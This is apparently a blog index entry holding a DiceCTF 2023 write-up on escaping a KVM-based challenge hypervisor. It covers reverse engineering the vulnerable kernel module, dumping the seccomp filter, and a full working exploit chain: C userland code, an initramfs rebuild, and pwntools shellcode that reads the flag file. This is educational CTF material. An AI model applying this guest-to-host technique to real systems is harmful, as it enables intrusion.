{"pages":[{"date":"2023-02-10","image":"/post-resources/pacman.png","imageAlt":"","link":"https://chalkiadakis.me/posts/dicectf23/dice-visor/","summary":"Surviving the trip from userland, to kernel, to hypervisor.","tags":["ctf","diceCTF","hypervisor","pwn"],"text":"categories: pwn\ndescription:\nwelcome to dicegang\u0026rsquo;s newest hypervisor-based security solution, dicer-visor.\nnc mc.ax 31313\nauthor: smoothhacker\ninitramfs.cpio.gz dicer-visor bzimage\nrecon for this challenge, we are given 3 files: a kernel image, an initramfs, and the dicer-visor binary which is the hypervisor itself.\nfane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fane@ctf-box:~/dicer-visor$ ./dicer-visor usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt; let\u0026rsquo;s run the challenge locally:\nfane@ctf-box:~/dicer-visor$ ./dicer-visor bzimage initramfs.cpio.gz dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm booting from rom... [ 0.000000] linux version 6.0.0 (scott@blackrock) (gcc (ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, gnu 3 [ 0.000000] command line: console=ttys0 nokaslr [ 0.000000] x86/fpu: supporting xsave feature 0x001: \u0026#39;x87 floating point registers\u0026#39; [ 0.000000] x86/fpu: supporting xsave feature 0x002: \u0026#39;sse registers\u0026#39; ... [ 0.468004] run /init as init process /init: line 7: can\u0026#39;t create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy [ 0.528008] vuln: loading out-of-tree module taints kernel. [ 0.532008] [!] vulnerable driver loaded /bin/sh: can\u0026#39;t access tty; job control turned off / # uname -a linux (none) 6.0.0 #15 fri feb 3 13:31:55 utc 2023 x86_64 gnu/linux / # so, the binary spawns a vm with the given initramfs and drops us to a shell. the vm is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module ([!] vulnerable driver loaded). inside the initramfs, we find the vuln.ko kernel module which we will analyze in a bit. we also can see the contents of init:\n/ # cat init #!/bin/sh #mount -t proc none /proc #mount -t sysfs none /sys #mount -t debugfs none /sys/kernel/debug echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 exec /bin/sh / # interesting! the vuln.ko kernel module is loaded and the character device /dev/exploited-device is created. but what is the exploitation strategy here? probably we need to interact with vuln.ko from inside the vm, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. let\u0026rsquo;s also try running on remote:\nwhen we connect to the remote, it asks us for a url to download an initramfs and then spawns the vm. when providing the original initramfs, after the vm loads, we get a kernel panic, probably crashing at exec /bin/sh in init. this is because on the remote side they probably have deleted the contents of /bin/* to avoid easy exploitation. so, let\u0026rsquo;s start analyzing the challenge files.\nanalysis - vuln.ko first, let\u0026rsquo;s extract the initramfs and load the vuln.ko in ghidra. we first analyze the entry and exit points of the kernel module which are init_module and cleanup_module respectively:\nvoid init_module(void) { long lvar1; __register_chrdev(0x20,0,0x100,\u0026#34;exploited-device\u0026#34;,fops); lvar1 = __request_region(\u0026amp;ioport_resource,0xdead,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xdead); } else { lvar1 = __request_region(\u0026amp;ioport_resource,0xd1ce,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xd1ce); } else { _printk(\u0026#34;\\x011[!] vulnerable driver loaded\\n\u0026#34;); } } __x86_return_thunk(); return; } void cleanup_module(void) { __x86_return_thunk(); return; } as we can see, the init_module creates the character device /dev/exploited-device with major number 32, base minor 0, and 0x100 minor numbers available to it (docs/__register_chrdev). next, it creates to regions for this device, both with size 1 byte. the first region is ad address 0xdead and the second region at address 0xd1ce (docs/__request_region).\nthe fops variable in __register_chrdev(), is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. usually, userland applications interact with the device through the /dev filesystem and file descriptors. from the init file, you should recall the line mknod /dev/exploited-device c 32 0, which makes a special character device with the same major and minor numbers as in the __register_chrdev() call.\nback to the fops variable. this variable is of type struct file_operations and is basically a big list of function pointers. these function pointers describe how the character device behaves when interacted as a file through /dev/exploited-device, e.g. via open, read, ioctl, etc.\nso, let\u0026rsquo;s examine all the registered function pointers in fops:\nchar shellcode[256]; //global variable int open(struct inode *, struct file *) { return 0; } void release(struct inode *, struct file *) { return 0; } ssize_t read(struct file *, char __user *, size_t, loff_t *) { return 0; } ssize_t write(struct file *, const char __user * __buf, size_t __n, loff_t *) { size_t copy_sz; ssize_t svar1; copy_sz = min(__n, 0x100); _copy_from_user(shellcode,__buf,copy_sz); svar1 = __x86_return_thunk(); return svar1; } void tl_ioctl(struct file *file, unsigned int cmd, unsigned long) { long i; _printk(\u0026#34;\\x011[!] driver ioctl issued - cmd: %d\\n\u0026#34;, cmd); if (cmd == 0xbeef) { out(0xd1ce,0xd1ce); //out dx,ax native_io_delay(); } else if (cmd == 0xdead) { for(i=0; i\u0026lt;0x100; i++) { out(0xdead,shellcode[i]); //out dx,al native_io_delay(); } } return 0; } so, to summarize the above operations:\nopen: noop. release: noop read: noop write: writes to the global shellcode kernel buffer up to 0x100 bytes provided by the userland buf. ioctl: the out that appear in the body of the function, are x86-specific assembly instructions. these instructions are used for port i/o, i.e. communication with hardware peripherals. since we are running inside a vm, we expect that these instructions will cause a trap to the hypervisor. (usually the vm runs at a lower privilege level than these instructions can be executed [1, 2, 3]) so, the ioctl command 0xbeef writes to the i/o port 0xd1ce the value d1ce; and the iotctl command 0xdead writes to the i/o port 0xdead the shellcode buffer (0x100 bytes). now it\u0026rsquo;s time to analyze the hypervisor!\nanalysis - dice-visor fane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fortunately, the hypervisor still has symbols as it is not stripped. let\u0026rsquo;s start the analysis from the main function:\nint main(int argc,char **argv) { int ivar1; char *err_msg; int aistack72 [2]; int fd; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(fd,0xae00,0); if (ivar1 == 0xc) { init_vm(aistack72); puts(\u0026#34;[*] created vm\u0026#34;); load_vm((long)aistack72,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(aistack72); cleanup_vm(aistack72); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1, \u0026#34;kvm_get_api_version\u0026#34;); } } as we see, the hypervisors uses the kernel\u0026rsquo;s kvm api to create the virtual machine. init_vm performs a lot of ioctl system calls, while load_vm does not perform any ioctl and simply mmaps the bzimage and the initramfs, sets some state variables in aistack72, and then returns. the value 0xae00 in the ioctl, corresponds to the #define kvm_get_api_version _io(kvmio, 0x00), where kvmio holds the value 0xae. with a little bit of manual reverse engineering effort, we recover the struct for aistack72 and also have a clean decompilation of the whole hypervisor:\n// ghidra-kvm.h contains struct definitions and macro #defines related to the kvm api. // extracted from the source code of the linux kernel. // e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h // consult the kernel source code and its documentation for what the structs are. // file located in solution/ghidra-kvm.h #include \u0026#34;ghidra-kvm.h\u0026#34; struct vm { int vm_fd; int vcpu_fd; int kvm_fd; undefined[4] padding; void *userspace_address; } undefined8 init_vm(struct vm *vm); undefined8 load_vm(struct vm *vm,char *bzimage_path,char *initramfs_path); undefined8 run_vm(struct vm *vm); undefined8 cleanup_vm(struct vm *vm); int main(int argc,char **argv) { int ivar1; char *pcvar2; struct vm vm; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); vm.kvm_fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (vm.kvm_fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(vm.kvm_fd,kvm_get_api_version ,0); if (ivar1 == 0xc) { init_vm(\u0026amp;vm); puts(\u0026#34;[*] created vm\u0026#34;); load_vm(\u0026amp;vm,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(\u0026amp;vm); cleanup_vm(\u0026amp;vm.vm_fd); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1,\u0026#34;kvm_get_api_version\u0026#34;); } } /* warning: could not reconcile some variable overlaps */ undefined8 init_vm(struct vm *vm) { int ivar1; void *userspace_addr; char *pcvar2; undefined8 local_70; struct kvm_userspace_memory_region kvm_userspace_memory_region; kvm_pit_config kvm_pit_config; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_create_vm ,0); vm-\u0026gt;vm_fd = ivar1; if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] vm creation failed\u0026#34;; } else { ivar1 = ioctl(ivar1,kvm_set_tss_addr,0xfffbd000); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set tss addr\u0026#34;; } else { local_70 = 0xffffc000; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_identity_map_addr,\u0026amp;local_70); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set identity map addr\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_irqchip,0); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create irq chip\u0026#34;; } else { kvm_pit_config.pad._44_16_ = zext816(0); kvm_pit_config.pad._28_16_ = zext816(0); kvm_pit_config.pad._12_16_ = zext816(0); kvm_pit_config._0_16_ = zext816(0); ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_pit2,\u0026amp;kvm_pit_config); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create i8254 interval timer\u0026#34;; } else { userspace_addr = mmap(null,0x10000000,3,0x4021,-1,0); vm-\u0026gt;userspace_address = userspace_addr; if (userspace_addr == null) { pcvar2 = \u0026#34;[!] failed to mmap vm memory\u0026#34;; } else { kvm_userspace_memory_region._0_8_ = 0x100000000; kvm_userspace_memory_region.guest_phys_addr._0_4_ = 0; kvm_userspace_memory_region.guest_phys_addr._4_4_ = 0; kvm_userspace_memory_region.memory_size._0_4_ = 0x10000000; kvm_userspace_memory_region.memory_size._4_4_ = 0; kvm_userspace_memory_region.userspace_addr = (ulong)userspace_addr; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_user_memory_region,\u0026amp;kvm_userspace_memory_region); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set user memory region\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_vcpu,0); vm-\u0026gt;vcpu_fd = ivar1; if (-1 \u0026lt; ivar1) { initvmregs(vm); createcpuid(vm); return 0; } pcvar2 = \u0026#34;[!] failed to create vcpu\u0026#34;; } } } } } } } err(1,pcvar2); } void *jit_mem; int jit_mem_counter; undefined8 run_vm(struct vm *vm) { int ivar1; kvm_run *vcpu; long idx; undefined seccomp_filter[]; //length omitted ushort port; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_get_vcpu_mmap_size,0); vcpu = (kvm_run *)mmap(null,ivar1,prot_read|prot_write,map_shared,vm-\u0026gt;vcpu_fd,0); jit_mem = (code *)mmap(null,0x100,prot_read|prot_write|proc_exec, map_shared|map_anonymous|map_noreserve,-1,0 ); jit_mem_counter = 0; /* init seccomp_filter */ /* ... */ //set seccomp filter ivar1 = prctl(pr_set_no_new_privs,1,0,0,0); if (ivar1 != 0) { perror(\u0026#34;prctl(no_new_privs)\u0026#34;); } ivar1 = prctl(pr_set_seccomp,2,seccomp_filter); if (ivar1 != 0) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); perror(\u0026#34;prctl(seccomp)\u0026#34;); //bug? if the seccomp filter fails, then we still attempt to execute the remaining of this function. //but the file descriptors have been closed and memory has been unmapped. oh well.. } //run the vm ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); while( true ) { if (ivar1 \u0026lt; 0) { return err(1,\u0026#34;kvm_run failed\u0026#34;); } if (vcpu-\u0026gt;exit_reason != kvm_exit_io) break; /* union case: kvm_exit_io */ port = vcpu-\u0026gt;unlabelled32.io.port; //vcpu-\u0026gt;unlabelled32.io.port if ((short)port \u0026lt; 0x61) { if (port == 0xd1ce) { (*jit_mem)(); } else if ((port == 0xdead) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { idx = (long)jit_mem_counter; if (idx \u0026lt;= 0x100) { //unintended off-by-one. jit_mem_counter++; jit_mem[idx] = *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset); } else { puts(\u0026#34;[!] maximum bytes read from guest\u0026#34;); } } } else if (port == 0x61 \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39;d\u0026#39;; } else if (port == 0x3fd \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39; \u0026#39;; } else if ((port == 0x3f8) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { write(1, (char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset, 1); } ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); //continue the vm } printf(\u0026#34;[!] unknown exit reason: %d\\n\u0026#34;, vcpu-\u0026gt;exit_reason); return -1; } undefined8 cleanup_vm(struct vm *vm) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); return 0; } the run_vm now is quite self-explanatory and interesting. as we recall from the vuln.ko, there were two out x86 instructions that we could invoke: out(0xd1ce,0xd1ce) and out(0xdead,shellcode[i]). from the hypervisor\u0026rsquo;s code, we can see that when the port is 0xd1ce, the contents of the jit_mem are executed. when the port is 0xdead, we write to the jit_mem the value of the source operand from the out x86 instructions. so, to sum it up:\nwrite syscall to the /dev/exploited-device: writes up to 0x100 bytes to the kernel\u0026rsquo;s shellcode buffer from a userland provided buffer. ioctl cmd 0xdead: out(0xdead, shellcode[i]). writes the 0x100 bytes from the kernel\u0026rsquo;s shellcode buffer to the hypervisor\u0026rsquo;s jit_mem. may be called only once. (otherwise you get the message \u0026ldquo;maximum bytes read from guest\u0026rdquo;.) ioctl cmd 0xbeef: out(0xd1ce,0xd1ce). will execute the contents in the jit_mem buffer. i.e. it will execute the shellcode provided from userland. seccomp filter one last thing to notice about run_vm, is that it sets up a seccomp filter. using seccomp-tools, we can easily dump it:\nfane@ctf-box:~/dicer-visor$ seccomp-tools dump \u0026#34;./dicer-visor bzimage initramfs.cpio.gz\u0026#34; dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm line code jt jf k ================================= 0000: 0x20 0x00 0x00 0x00000004 a = arch 0001: 0x15 0x01 0x00 0xc000003e if (a == arch_x86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return kill 0003: 0x20 0x00 0x00 0x00000000 a = sys_number 0004: 0x15 0x00 0x01 0x00000029 if (a != socket) goto 0006 0005: 0x06 0x00 0x00 0x80000000 return kill_process 0006: 0x15 0x00 0x01 0x00000039 if (a != fork) goto 0008 0007: 0x06 0x00 0x00 0x80000000 return kill_process 0008: 0x15 0x00 0x01 0x00000021 if (a != dup2) goto 0010 0009: 0x06 0x00 0x00 0x80000000 return kill_process 0010: 0x15 0x00 0x01 0x00000142 if (a != execveat) goto 0012 0011: 0x06 0x00 0x00 0x80000000 return kill_process 0012: 0x06 0x00 0x00 0x7fff0000 return allow so, this is a blacklist of socket, fork, dup2, and execveat system calls. however, we can still use open and write, and the remote provides us the output of the hypervisor!\nexploitation so, let\u0026rsquo;s create a userland program that when executed performs the trip to the hypervisor and executes some shellcode:\n//main.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; const char *shellcode = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;; //4x \u0026#34;nop\u0026#34; instruction const size_t shellcode_len = 4; int main(int argc, char ** argv) { int fd = open(\u0026#34;/dev/exploited-device\u0026#34;, o_rdwr); if(fd == -1) { perror(\u0026#34;open\u0026#34;); exit(1); } ssize_t res = write(fd, shellcode, shellcode_len); if(res != shellcode_len) { printf(\u0026#34;write error. written: %ld\\n\u0026#34;, res); exit(1); } if ( (res = ioctl(fd, 0xdead)) \u0026lt; 0) { //write shellcode to supervisor perror(\u0026#34;ioctl1\u0026#34;); exit(1); } if ( (res = ioctl(fd, 0xbeef)) \u0026lt; 0) { //invoke shellcode perror(\u0026#34;ioctl2\u0026#34;); exit(1); } return 0; } next, let\u0026rsquo;s write a script that builds our userland program and re-creates the initramfs:\n#!/bin/sh set -e gcc -static main.c -o main mv main initramfs cd initramfs find . -print0 | cpio --null --create --verbose --format=newc | gzip --best \u0026gt; ../initramfs_patched.cpio.gz cd - finally, we modify the init script to invoke our main program when the kernel boots:\n#!/bin/sh echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress echo \u0026#34;hello kernel world!\u0026#34; /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 chmod ugo+x /main exec /main shellcode generation to generate our shellcode and dump the flag, we use pwntools\n# gen-shellcode.py from pwn import * # set up pwntools for the correct architecture. context.binary = elfexe = elf(\u0026#39;./dicer-visor\u0026#39;) def dumpshellcode(shellcode): shellcode_str = \u0026#39;\u0026#39; for b in shellcode: shellcode_str += \u0026#34;\\\\x{:02x}\u0026#34;.format(b) msg = f\u0026#39;const char *shellcode = \u0026#34;{shellcode_str}\u0026#34;;\\n\u0026#39; msg += f\u0026#39;const size_t shellcode_len = {len(shellcode)};\u0026#39; print(msg) shellcode = asm( \u0026#39;\u0026#39;\u0026#39; xor rdx, rdx /* o_rdonly */ \u0026#39;\u0026#39;\u0026#39; + pwnlib.shellcraft.linux.cat(\u0026#34;flag.txt\u0026#34;) ) dumpshellcode(shellcode) when we execute python gen-shellcode.py, we get our c-style formatted shellcode which we can plug into our main.c:\nfane@ctf-box:~/dicer-visor$ python gen-shellcode.py const char *shellcode = \u0026#34;\\x48\\x31\\xd2\\x6a\\x01\\xfe\\x0c\\x24\\x48\\xb8\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x50\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05\u0026#34;; const size_t shellcode_len = 47; getting the flag finally we run build.sh to create the initramfs_patched.cpio.gz that contains the modified init script and our main binary. when we connect to the remote and provide our initramfs_patched.cpio.gz for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of flag.txt!\ndice{dicer-visor-rules}\n","title":"Pwning a hypervisor - DiceCTF 2023"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chalkiadakis.me/whoami/","summary":"","tags":[],"text":"","title":"About me"}]}